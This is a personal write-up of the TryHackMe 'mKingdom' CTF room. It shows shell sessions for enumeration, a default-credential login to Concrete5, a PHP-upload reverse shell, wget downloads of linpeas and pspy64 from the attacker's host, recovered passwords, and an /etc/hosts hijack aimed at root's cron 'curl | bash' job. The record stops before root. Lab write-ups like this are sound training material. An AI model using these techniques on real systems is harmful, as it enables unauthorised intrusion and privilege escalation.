# mKingdom Tryhackme CTF Challange

## Nmap Scan : Target IP: `10.201.74.68`

`nmap -sV 10.201.74.68`

**Result:**

`85/tcp open http Apache httpd 2.4.7 ((Ubuntu)`

## Directory Enumeration (Gobuster)

`gobuster dir -u http://10.201.74.68:85/ -w /usr/share/wordlists/dirb/big.txt`

**Result:**

`┌──(root㉿kali)-[/home/kali/Bug_Bounty/ctf/mkingdom]`  
`└─# gobuster dir -u http://10.201.74.68:85/ -w /usr/share/wordlists/dirb/big.txt`  
`===============================================================`  
`Gobuster v3.6`  
`by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)`  
`===============================================================`  
`[+] Url: http://10.201.74.68:85/`  
`[+] Method: GET`  
`[+] Threads: 10`  
`[+] Wordlist: /usr/share/wordlists/dirb/big.txt`  
`[+] Negative Status codes: 404`  
`[+] User Agent: gobuster/3.6`  
`[+] Timeout: 10s`  
`===============================================================`  
`Starting gobuster in directory enumeration mode`  
`===============================================================`  
`/.htpasswd (Status: 403) [Size: 288]`  
`/.htaccess (Status: 403) [Size: 288]`  
`/app (Status: 301) [Size: 312] [--> http://10.201.74.68:85/app/]`

`http://10.201.74.68:85/app/` open this linke in the browser

`![Screenshot From 2025-08-29 09-56-13.png](../_resources/Screenshot%20From%202025-08-29%2009-56-13.png)`

![Screenshot From 2025-08-29 09-56-17.png](../_resources/Screenshot%20From%202025-08-29%2009-56-17.png)

it's rediracting to this page

&nbsp;

![Screenshot From 2025-08-29 09-56-23.png](../_resources/Screenshot%20From%202025-08-29%2009-56-23.png)

&nbsp;

While browsing `/app/`, it was identified that the site is built on **Concrete5 CMS**.

&nbsp;

&nbsp;

![Screenshot From 2025-08-29 09-56-59.png](../_resources/Screenshot%20From%202025-08-29%2009-56-59.png)

&nbsp;

&nbsp;

found login page /app/login with default cred `admin:password`

&nbsp;

![Screenshot From 2025-08-29 10-07-55.png](../_resources/Screenshot%20From%202025-08-29%2010-07-55.png)

&nbsp;

&nbsp;

![Screenshot From 2025-08-29 10-13-28.png](../_resources/Screenshot%20From%202025-08-29%2010-13-28.png)

&nbsp;

While testing the **Concrete5 CMS** instance at `/app/`, it was observed that after some modifications to the upload functionality, the server accepted **PHP files**.

&nbsp;

&nbsp;

`──(root㉿kali)-[~kali/Bug_Bounty/ctf/mkingdom]`  
`└─# nc -lnvp 4444`  
`listening on [any] 4444 ...`  
`connect to [10.9.240.91] from (UNKNOWN) [10.201.74.68] 53828`  
`Linux mkingdom.thm 4.4.0-148-generic #174~14.04.1-Ubuntu SMP Thu May 9 08:17:37 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux`  
   ` 00:47:58 up 42 min, 0 users, load average: 0.00, 0.00, 0.00`  
`USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT`  
`uid=33(www-data) gid=33(www-data) groups=33(www-data),1003(web)`  
`/bin/sh: 0: can't access tty; job control turned off`  
`$ python -c 'import pty;pty.spawn("/bin/bash")'`  
`www-data@mkingdom:/$ ls`  
`ls`  
`bin dev initrd.img lib64 mnt root srv usr vmlinuz.old`  
`boot etc initrd.img.old lost+found opt run sys var`  
`cdrom home lib media proc sbin tmp vmlinuz`  
`www-data@mkingdom:/$ cd /home`  
`cd /home`  
`www-data@mkingdom:/home$ ls`  
`ls`  
`mario toad`  
`www-data@mkingdom:/home$ cd mario`  
`cd mario`  
`bash: cd: mario: Permission denied`  
`www-data@mkingdom:/home$ cd toad`  
`cd toad`  
`bash: cd: toad: Permission denied`  
`www-data@mkingdom:/home$ cd /tmp`  
`cd /tmp`  
`www-data@mkingdom:/tmp$ ls`  
`ls`  
`www-data@mkingdom:/tmp$ wget http://10.9.240.91:8000/linpeas.sh`  
`wget http://10.9.240.91:8000/linpeas.sh`  
`--2025-08-29 00:52:11-- http://10.9.240.91:8000/linpeas.sh`  
`Connecting to 10.9.240.91:8000... connected.`  
`HTTP request sent, awaiting response... 200 OK`  
`Length: 956174 (934K) [text/x-sh]`  
`Saving to: 'linpeas.sh'`  
`100%[======================================>] 956,174 434KB/s in 2.2s`  
`2025-08-29 00:52:14 (434 KB/s) - 'linpeas.sh' saved [956174/956174]`  
`www-data@mkingdom:/tmp$ ls`  
`ls`  
`linpeas.sh`

  
**run linpeas.sh**

&nbsp;

`![33de2de980b5289e67117639a0403a7d.png](../_resources/33de2de980b5289e67117639a0403a7d.png)`

`found toad password toad password  "toadisthebest"`

`su toad`  
`Password: toadisthebest`  
`toad@mkingdom:/home$ ls`  
`ls`  
`mario toad`  
`toad@mkingdom:/home$ cd toad`  
`cd toad`  
`toad@mkingdom:~$ ls`  
`ls`  
`Desktop Downloads Pictures smb.txt Videos`  
`Documents Music Public Templates`  
`toad@mkingdom:~$ cat smb.txt`  
`cat smb.txt`  
`Save them all Mario!`

&nbsp;                                                                           `                                      \| /`  
                                        `                    ....'''. |/`  
                          `             .'''''' '. \ |`  
                          `             '. .. ..''''. \| /`  
                            `              '...'' '..'' .' |/`  
          `     .sSSs. '.. ..' \ |`  
        ``    .P' `Y. ''' \| /``  
        `    SS SS |/`  
        `    SS SS |`  
        `    SS .sSSs. .===.`  
        ``    SS .P' `Y. | ? |``  
        ``    SS SS SS `==='``  
        `    SS "" SS`  
        `    P.sSSs. SS`  
        ``    .P' `Y. SS``  
        `    SS SS SS .===..===..===..===.`  
        `    SS SS SS | || ? || || |`  
        ``    "" SS SS .===.`==='`==='`==='`==='``  
    `  .sSSs. SS SS | |`  
  `` .P' `Y. SS SS .===.`==='``  
  ` SS SS SS SS | |`  
  `` SS SS SS SS `==='``  
`SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS`

`![04d22717a75613587f8ee84f662ede58.png](../_resources/04d22717a75613587f8ee84f662ede58.png)`

here have  pwd_token=aWthVGVOVEFOdEVTCg==  
<br/>decode base64 ---> ikaTeNTANtES

it also the password of mario 

su mario 

`mario@mkingdom:/$ find / -type f -name cat 2>/dev/null`  
`find / -type f -name cat 2>/dev/null`  
`/bin/cat`  
`/usr/lib/klibc/bin/cat`  
`mario@mkingdom:/$ /usr/lib/klibc/bin/cat user.txt`  
`/usr/lib/klibc/bin/cat user.txt`  
`user.txt: No such file or directory`  
`mario@mkingdom:/$ cd home/mario`  
`cd home/mario`  
`mario@mkingdom:~$ /usr/lib/klibc/bin/cat user.txt`  
`/usr/lib/klibc/bin/cat user.txt`  
`thm{030a769febb1b3291da1375234b84283}`  
`mario@mkingdom:~$ /usr/lib/klibc/bin/cat /root/root.txt`  
`/usr/lib/klibc/bin/cat /root/root.txt`  
`/root/root.txt: Permission denied`  
`mario@mkingdom:~$ /usr/lib/klibc/bin/cat > user.txt`  
`/usr/lib/klibc/bin/cat > user.txt`  
`bash: user.txt: Permission denied`

mario@mkingdom:~\$ wget http://10.9.240.91:8000/ctf/pspy64  
wget http://10.9.240.91:8000/ctf/pspy64  
\--2025-08-29 01:56:28-- http://10.9.240.91:8000/ctf/pspy64  
Connecting to 10.9.240.91:8000... connected.  
HTTP request sent, awaiting response... 200 OK  
Length: 3104768 (3.0M) \[application/octet-stream\]  
Saving to: ‘pspy64’

100%\[======================================>\] 3,104,768 388KB/s in 8.7s

2025-08-29 01:56:37 (349 KB/s) - ‘pspy64’ saved \[3104768/3104768\]

mario@mkingdom:~\$ ls  
ls  
Desktop Downloads Music pspy64 pwnkit user.txt  
Documents id Pictures Public Templates Videos  
mario@mkingdom:~\$ chmod +x pspy64  
chmod +x pspy64  
mario@mkingdom:~\$ ./pspy64  
./pspy64  
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d

&nbsp;` `

&nbsp;    ██▓███ ██████ ██▓███ ▓██ ██▓  
    ▓██░ ██▒▒██ ▒ ▓██░ ██▒▒██ ██▒  
    ▓██░ ██▓▒░ ▓██▄ ▓██░ ██▓▒ ▒██ ██░  
    ▒██▄█▓▒ ▒ ▒ ██▒▒██▄█▓▒ ▒ ░ ▐██▓░  
    ▒██▒ ░ ░▒██████▒▒▒██▒ ░ ░ ░ ██▒▓░  
    ▒▓▒░ ░ ░▒ ▒▓▒ ▒ ░▒▓▒░ ░ ░ ██▒▒▒  
    ░▒ ░ ░ ░▒ ░ ░░▒ ░ ▓██ ░▒░  
    ░░ ░ ░ ░ ░░ ▒ ▒ ░░  
                   ░ ░ ░  
                               ░ ░

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: \[/usr /tmp /etc /home /var /opt\] (recursive) | \[\] (non-recursive)  
Draining file system events due to startup...  
done  
2025/08/29 01:57:25 CMD: UID=1002 PID=23874 | xxd  
2025/08/29 01:57:25 CMD: UID=1002 PID=23873 | dd bs=9000 count=1  
2025/08/29 01:57:25 CMD: UID=1002 PID=23865 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 &lt;&3 2&gt;/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"  
2025/08/29 01:57:25 CMD: UID=1002 PID=23862 | grep accessible  
2025/08/29 01:57:25 CMD: UID=1002 PID=23861 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 &lt;&3 2&gt;/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"  
2025/08/29 01:57:25 CMD: UID=1002 PID=23855 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 &lt;&3 2&gt;/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"  
2025/08/29 01:57:25 CMD: UID=33 PID=19899 | xxd  
2025/08/29 01:57:25 CMD: UID=33 PID=19898 | dd bs=9000 count=1  
2025/08/29 01:57:25 CMD: UID=33 PID=19893 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 &lt;&3 2&gt;/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"  
2025/08/29 01:57:25 CMD: UID=33 PID=19892 | grep accessible  
2025/08/29 01:57:25 CMD: UID=33 PID=19891 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 &lt;&3 2&gt;/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"  
2025/08/29 01:57:25 CMD: UID=33 PID=19880 | bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 &lt;&3 2&gt;/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"  
2025/08/29 01:57:25 CMD: UID=1001 PID=8812 | ./pspy64  
2025/08/29 01:57:25 CMD: UID=1001 PID=8700 | bash  
2025/08/29 01:57:25 CMD: UID=0 PID=8699 | su mario  
2025/08/29 01:57:25 CMD: UID=33 PID=8696 | /bin/bash  
2025/08/29 01:57:25 CMD: UID=33 PID=8695 | python -c import pty;pty.spawn("/bin/bash")  
2025/08/29 01:57:25 CMD: UID=33 PID=8694 | /bin/sh -i  
2025/08/29 01:57:25 CMD: UID=33 PID=8690 | sh -c uname -a; w; id; /bin/sh -i  
2025/08/29 01:57:25 CMD: UID=1001 PID=8679 | /usr/lib/klibc/bin/cat  
2025/08/29 01:57:25 CMD: UID=1001 PID=8434 | bash  
2025/08/29 01:57:25 CMD: UID=0 PID=8433 | su mario  
2025/08/29 01:57:25 CMD: UID=1002 PID=8260 | bash  
2025/08/29 01:57:25 CMD: UID=0 PID=8250 | su toad  
2025/08/29 01:57:25 CMD: UID=33 PID=8247 | /bin/bash  
2025/08/29 01:57:25 CMD: UID=33 PID=8246 | python -c import pty;pty.spawn("/bin/bash")  
2025/08/29 01:57:25 CMD: UID=33 PID=8244 | /bin/sh -i  
2025/08/29 01:57:25 CMD: UID=33 PID=8240 | sh -c uname -a; w; id; /bin/sh -i  
2025/08/29 01:57:25 CMD: UID=1002 PID=8174 | mysql -u toad -p -h localhost  
2025/08/29 01:57:25 CMD: UID=1002 PID=5550 | bash  
2025/08/29 01:57:25 CMD: UID=0 PID=5549 | su toad  
2025/08/29 01:57:25 CMD: UID=33 PID=2414 | /bin/bash  
2025/08/29 01:57:25 CMD: UID=33 PID=2413 | python -c import pty;pty.spawn("/bin/bash")  
2025/08/29 01:57:25 CMD: UID=33 PID=2394 | /bin/sh -i  
2025/08/29 01:57:25 CMD: UID=33 PID=2390 | sh -c uname -a; w; id; /bin/sh -i  
2025/08/29 01:57:25 CMD: UID=33 PID=2357 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2273 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2208 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2207 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2125 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=0 PID=2108 | /usr/lib/apt/methods/http  
2025/08/29 01:57:25 CMD: UID=0 PID=2107 | /usr/lib/apt/methods/http  
2025/08/29 01:57:25 CMD: UID=0 PID=2106 | /usr/lib/apt/methods/http  
2025/08/29 01:57:25 CMD: UID=0 PID=2105 | /usr/lib/apt/methods/http  
2025/08/29 01:57:25 CMD: UID=0 PID=2104 | /usr/lib/apt/methods/https  
2025/08/29 01:57:25 CMD: UID=0 PID=2100 | apt-get -qq -y update  
2025/08/29 01:57:25 CMD: UID=33 PID=2050 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2040 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2035 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=33 PID=2034 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=0 PID=1879 | /bin/sh /etc/cron.daily/apt  
2025/08/29 01:57:25 CMD: UID=0 PID=1871 | run-parts --report /etc/cron.daily  
2025/08/29 01:57:25 CMD: UID=0 PID=1870 | /bin/sh -c run-parts --report /etc/cron.daily  
2025/08/29 01:57:25 CMD: UID=0 PID=1810 | /usr/sbin/cupsd -f  
2025/08/29 01:57:25 CMD: UID=113 PID=1798 | /usr/lib/colord/colord  
2025/08/29 01:57:25 CMD: UID=112 PID=1777 | /usr/lib/x86_64-linux-gnu/notify-osd  
2025/08/29 01:57:25 CMD: UID=107 PID=1739 | /usr/lib/rtkit/rtkit-daemon  
2025/08/29 01:57:25 CMD: UID=112 PID=1737 | /usr/bin/pulseaudio --start --log-target=syslog  
2025/08/29 01:57:25 CMD: UID=112 PID=1682 | /usr/lib/x86_64-linux-gnu/gconf/gconfd-2  
2025/08/29 01:57:25 CMD: UID=112 PID=1675 | /usr/lib/x86_64-linux-gnu/indicator-application/indicator-application-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1656 | /usr/lib/x86_64-linux-gnu/indicator-session/indicator-session-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1655 | /usr/lib/unity-settings-daemon/unity-settings-daemon  
2025/08/29 01:57:25 CMD: UID=112 PID=1653 | /usr/lib/x86_64-linux-gnu/indicator-keyboard-service --use-gtk  
2025/08/29 01:57:25 CMD: UID=0 PID=1651 | /usr/lib/upower/upowerd  
2025/08/29 01:57:25 CMD: UID=112 PID=1643 | /usr/lib/x86_64-linux-gnu/indicator-sound/indicator-sound-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1642 | /usr/lib/x86_64-linux-gnu/indicator-datetime/indicator-datetime-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1641 | /usr/lib/x86_64-linux-gnu/indicator-power/indicator-power-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1636 | /usr/lib/x86_64-linux-gnu/indicator-bluetooth/indicator-bluetooth-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1634 | /usr/lib/x86_64-linux-gnu/indicator-messages/indicator-messages-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1631 | nm-applet  
2025/08/29 01:57:25 CMD: UID=112 PID=1629 | init --user --startup-event indicator-services-start  
2025/08/29 01:57:25 CMD: UID=0 PID=1626 | lightdm --session-child 12 19  
2025/08/29 01:57:25 CMD: UID=112 PID=1616 | /usr/lib/dconf/dconf-service  
2025/08/29 01:57:25 CMD: UID=112 PID=1606 | /usr/lib/gvfs/gvfsd-fuse /run/user/112/gvfs -f -o big_writes  
2025/08/29 01:57:25 CMD: UID=112 PID=1601 | /usr/lib/gvfs/gvfsd  
2025/08/29 01:57:25 CMD: UID=112 PID=1596 | /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session  
2025/08/29 01:57:25 CMD: UID=112 PID=1592 | /bin/dbus-daemon --config-file=/etc/at-spi2/accessibility.conf --nofork --print-address 3  
2025/08/29 01:57:25 CMD: UID=112 PID=1587 | /usr/lib/at-spi2-core/at-spi-bus-launcher --launch-immediately  
2025/08/29 01:57:25 CMD: UID=112 PID=1582 | /usr/sbin/unity-greeter  
2025/08/29 01:57:25 CMD: UID=112 PID=1581 | //bin/dbus-daemon --fork --print-pid 5 --print-address 7 --session  
2025/08/29 01:57:25 CMD: UID=112 PID=1576 | /bin/sh /usr/lib/lightdm/lightdm-greeter-session /usr/sbin/unity-greeter  
2025/08/29 01:57:25 CMD: UID=0 PID=1569 | lightdm --session-child 16 19  
2025/08/29 01:57:25 CMD: UID=0 PID=1414 | /sbin/getty -8 38400 tty1  
2025/08/29 01:57:25 CMD: UID=33 PID=1376 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=0 PID=1352 |  
2025/08/29 01:57:25 CMD: UID=0 PID=1325 | /usr/sbin/apache2 -k start  
2025/08/29 01:57:25 CMD: UID=118 PID=1301 | /usr/sbin/mysqld  
2025/08/29 01:57:25 CMD: UID=109 PID=1285 | whoopsie  
2025/08/29 01:57:25 CMD: UID=0 PID=1273 | /usr/lib/accountsservice/accounts-daemon  
2025/08/29 01:57:25 CMD: UID=0 PID=1269 | /usr/lib/xorg/Xorg -core :0 -seat seat0 -auth /var/run/lightdm/root/:0 -nolisten tcp vt7 -novtswitch  
2025/08/29 01:57:25 CMD: UID=0 PID=1261 | /usr/lib/policykit-1/polkitd --no-debug  
2025/08/29 01:57:25 CMD: UID=106 PID=1199 | /usr/sbin/kerneloops  
2025/08/29 01:57:25 CMD: UID=0 PID=1190 | /usr/sbin/cups-browsed  
2025/08/29 01:57:25 CMD: UID=0 PID=1174 | lightdm  
2025/08/29 01:57:25 CMD: UID=0 PID=1143 | NetworkManager  
2025/08/29 01:57:25 CMD: UID=0 PID=1115 | cron  
2025/08/29 01:57:25 CMD: UID=0 PID=1104 | anacron -s  
2025/08/29 01:57:25 CMD: UID=0 PID=1103 | acpid -c /etc/acpi/events -s /var/run/acpid.socket  
2025/08/29 01:57:25 CMD: UID=0 PID=1073 | /sbin/getty -8 38400 tty6  
2025/08/29 01:57:25 CMD: UID=0 PID=1070 | /usr/bin/amazon-ssm-agent  
2025/08/29 01:57:25 CMD: UID=0 PID=1067 | /sbin/getty -8 38400 tty3  
2025/08/29 01:57:25 CMD: UID=0 PID=1064 | /sbin/getty -8 38400 tty2  
2025/08/29 01:57:25 CMD: UID=0 PID=1054 | /sbin/getty -8 38400 tty5  
2025/08/29 01:57:25 CMD: UID=0 PID=1050 | /sbin/getty -8 38400 tty4  
2025/08/29 01:57:25 CMD: UID=0 PID=847 | /usr/sbin/ModemManager  
2025/08/29 01:57:25 CMD: UID=0 PID=720 | dhclient -1 -v -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases eth0  
2025/08/29 01:57:25 CMD: UID=0 PID=614 |  
2025/08/29 01:57:25 CMD: UID=0 PID=612 |  
2025/08/29 01:57:25 CMD: UID=0 PID=592 | upstart-socket-bridge --daemon  
2025/08/29 01:57:25 CMD: UID=0 PID=487 | /usr/sbin/bluetoothd  
2025/08/29 01:57:25 CMD: UID=111 PID=459 | avahi-daemon: chroot helper  
2025/08/29 01:57:25 CMD: UID=111 PID=458 | avahi-daemon: running \[mkingdom.local\]  
2025/08/29 01:57:25 CMD: UID=0 PID=457 | /lib/systemd/systemd-logind  
2025/08/29 01:57:25 CMD: UID=102 PID=413 | dbus-daemon --system --fork  
2025/08/29 01:57:25 CMD: UID=101 PID=408 | rsyslogd  
2025/08/29 01:57:25 CMD: UID=0 PID=373 | upstart-file-bridge --daemon  
2025/08/29 01:57:25 CMD: UID=0 PID=341 |  
2025/08/29 01:57:25 CMD: UID=0 PID=340 |  
2025/08/29 01:57:25 CMD: UID=0 PID=330 |  
2025/08/29 01:57:25 CMD: UID=0 PID=329 |  
2025/08/29 01:57:25 CMD: UID=0 PID=309 | /lib/systemd/systemd-udevd --daemon  
2025/08/29 01:57:25 CMD: UID=0 PID=285 | upstart-udev-bridge --daemon  
2025/08/29 01:57:25 CMD: UID=0 PID=170 |  
2025/08/29 01:57:25 CMD: UID=0 PID=155 |  
2025/08/29 01:57:25 CMD: UID=0 PID=154 |  
2025/08/29 01:57:25 CMD: UID=0 PID=144 |  
2025/08/29 01:57:25 CMD: UID=0 PID=85 |  
2025/08/29 01:57:25 CMD: UID=0 PID=84 |  
2025/08/29 01:57:25 CMD: UID=0 PID=71 |  
2025/08/29 01:57:25 CMD: UID=0 PID=70 |  
2025/08/29 01:57:25 CMD: UID=0 PID=65 |  
2025/08/29 01:57:25 CMD: UID=0 PID=63 |  
2025/08/29 01:57:25 CMD: UID=0 PID=62 |  
2025/08/29 01:57:25 CMD: UID=0 PID=61 |  
2025/08/29 01:57:25 CMD: UID=0 PID=60 |  
2025/08/29 01:57:25 CMD: UID=0 PID=59 |  
2025/08/29 01:57:25 CMD: UID=0 PID=58 |  
2025/08/29 01:57:25 CMD: UID=0 PID=57 |  
2025/08/29 01:57:25 CMD: UID=0 PID=56 |  
2025/08/29 01:57:25 CMD: UID=0 PID=55 |  
2025/08/29 01:57:25 CMD: UID=0 PID=54 |  
2025/08/29 01:57:25 CMD: UID=0 PID=53 |  
2025/08/29 01:57:25 CMD: UID=0 PID=52 |  
2025/08/29 01:57:25 CMD: UID=0 PID=51 |  
2025/08/29 01:57:25 CMD: UID=0 PID=50 |  
2025/08/29 01:57:25 CMD: UID=0 PID=49 |  
2025/08/29 01:57:25 CMD: UID=0 PID=33 |  
2025/08/29 01:57:25 CMD: UID=0 PID=32 |  
2025/08/29 01:57:25 CMD: UID=0 PID=31 |  
2025/08/29 01:57:25 CMD: UID=0 PID=30 |  
2025/08/29 01:57:25 CMD: UID=0 PID=28 |  
2025/08/29 01:57:25 CMD: UID=0 PID=27 |  
2025/08/29 01:57:25 CMD: UID=0 PID=26 |  
2025/08/29 01:57:25 CMD: UID=0 PID=25 |  
2025/08/29 01:57:25 CMD: UID=0 PID=24 |  
2025/08/29 01:57:25 CMD: UID=0 PID=23 |  
2025/08/29 01:57:25 CMD: UID=0 PID=22 |  
2025/08/29 01:57:25 CMD: UID=0 PID=21 |  
2025/08/29 01:57:25 CMD: UID=0 PID=20 |  
2025/08/29 01:57:25 CMD: UID=0 PID=19 |  
2025/08/29 01:57:25 CMD: UID=0 PID=18 |  
2025/08/29 01:57:25 CMD: UID=0 PID=17 |  
2025/08/29 01:57:25 CMD: UID=0 PID=16 |  
2025/08/29 01:57:25 CMD: UID=0 PID=15 |  
2025/08/29 01:57:25 CMD: UID=0 PID=14 |  
2025/08/29 01:57:25 CMD: UID=0 PID=13 |  
2025/08/29 01:57:25 CMD: UID=0 PID=12 |  
2025/08/29 01:57:25 CMD: UID=0 PID=11 |  
2025/08/29 01:57:25 CMD: UID=0 PID=10 |  
2025/08/29 01:57:25 CMD: UID=0 PID=9 |  
2025/08/29 01:57:25 CMD: UID=0 PID=8 |  
2025/08/29 01:57:25 CMD: UID=0 PID=7 |  
2025/08/29 01:57:25 CMD: UID=0 PID=6 |  
2025/08/29 01:57:25 CMD: UID=0 PID=5 |  
2025/08/29 01:57:25 CMD: UID=0 PID=3 |  
2025/08/29 01:57:25 CMD: UID=0 PID=2 |  
2025/08/29 01:57:25 CMD: UID=0 PID=1 | /sbin/init  
2025/08/29 01:58:01 CMD: UID=0 PID=8824 | bash  
2025/08/29 01:58:01 CMD: UID=0 PID=8823 | curl mkingdom.thm:85/app/castle/application/counter.sh  
2025/08/29 01:58:01 CMD: UID=0 PID=8822 | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2025/08/29 01:58:01 CMD: UID=0 PID=8821 | CRON  
2025/08/29 01:58:01 CMD: UID=0 PID=8826 | bash  
2025/08/29 01:58:01 CMD: UID=0 PID=8828 | bash  
2025/08/29 01:58:01 CMD: UID=0 PID=8827 | bash  
2025/08/29 01:58:02 CMD: UID=0 PID=8829 |  
q2025/08/29 01:59:01 CMD: UID=0 PID=8833 | bash  
2025/08/29 01:59:01 CMD: UID=0 PID=8832 | curl mkingdom.thm:85/app/castle/application/counter.sh  
2025/08/29 01:59:01 CMD: UID=0 PID=8831 | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log  
2025/08/29 01:59:01 CMD: UID=0 PID=8830 | CRON  
2025/08/29 01:59:01 CMD: UID=0 PID=8835 | bash  
2025/08/29 01:59:01 CMD: UID=0 PID=8837 | bash  
2025/08/29 01:59:01 CMD: UID=0 PID=8836 | ls -laR /var/www/html/app/castle/

`mario@mkingdom:/tmp$ ls -lha /etc/hosts`  
`ls -lha /etc/hosts`  
`-rw-rw-r-- 1 root mario 342 Jan 26 2024 /etc/hosts`  
`mario@mkingdom:/tmp$ cat /etc/hosts`  
`cat /etc/hosts`  
`127.0.0.1 localhost`  
`127.0.1.1 mkingdom.thm`  
`127.0.0.1 backgroundimages.concrete5.org`  
`127.0.0.1 www.concrete5.org`  
`127.0.0.1 newsflow.concrete5.org`

`# The following lines are desirable for IPv6 capable hosts`  
`::1 ip6-localhost ip6-loopback`  
`fe00::0 ip6-localnet`  
`ff00::0 ip6-mcastprefix`  
`ff02::1 ip6-allnodes`  
`ff02::2 ip6-allrouters`

`mario@mkingdom:/tmp$ echo "10.9.240.91 mkingdom.thm" >> /etc/hosts`  
`echo "10.9.240.91 mkingdom.thm" >> /etc/hosts`  
`mario@mkingdom:/tmp$ cat /etc/hosts`  
`cat /etc/hosts`  
`127.0.0.1 localhost`  
`127.0.1.1 mkingdom.thm`  
`127.0.0.1 backgroundimages.concrete5.org`  
`127.0.0.1 www.concrete5.org`  
`127.0.0.1 newsflow.concrete5.org`

`# The following lines are desirable for IPv6 capable hosts`  
`::1 ip6-localhost ip6-loopback`  
`fe00::0 ip6-localnet`  
`ff00::0 ip6-mcastprefix`  
`ff02::1 ip6-allnodes`  
`ff02::2 ip6-allrouters`

`10.9.240.91 mkingdom.thm`  
`mario@mkingdom:/tmp$ curl mkingdom.thm:85/app/castle/application/counter.sh`  
`curl mkingdom.thm:85/app/castle/application/counter.sh`  
`#!/bin/bash`  
`echo "There are $(ls -laR /var/www/html/app/castle/ | wc -l) folder and files in TheCastleApp in - - - - > $(date)."`  
`mario@mkingdom:/tmp$ sed -i 's/^127\.0\.1\.1[ \t]\+mkingdom\.thm/10.9.240.91 mkingdom.thm/' /etc/hosts`  
`<ingdom\.thm/10.9.240.91 mkingdom.thm/' /etc/hosts`  
`sed: couldn't open temporary file /etc/sedQdXJSl: Permission denied`  
`mario@mkingdom:/tmp$ cat > /etc/hosts`  
`cat > /etc/hosts`  
`127.0.0.1 localhost`  
`10.9.240.91 mkingdom.thm`  
`127.0.0.1 backgroundimages.concrete5.org`  
`127.0.0.1 www.concrete5.org`  
`127.0.0.1 newsflow.concrete5.org`

`# The following lines are desirable for IPv6 capable hosts`  
`::1 ip6-localhost ip6-loopback`  
`fe00::0 ip6-localnet`  
`ff00::0 ip6-mcastprefix`  
`ff02::1 ip6-allnodes`  
`ff02::2 ip6-allrouters127.0.0.1 localhost`  
`10.9.240.91 mkingdom.thm`  
`127.0.0.1 backgroundimages.concrete5.org`  
`127.0.0.1 www.concrete5.org`  
`127.0.0.1 newsflow.concrete5.org`

`# The following lines are desirable for IPv6 capable hosts`  
`::1 ip6-localhost ip6-loopback`  
`fe00::0 ip6-localnet`  
`ff00::0 ip6-mcastprefix`  
`ff02::1 ip6-allnodes`  
`ff02::2 ip6-allrouters`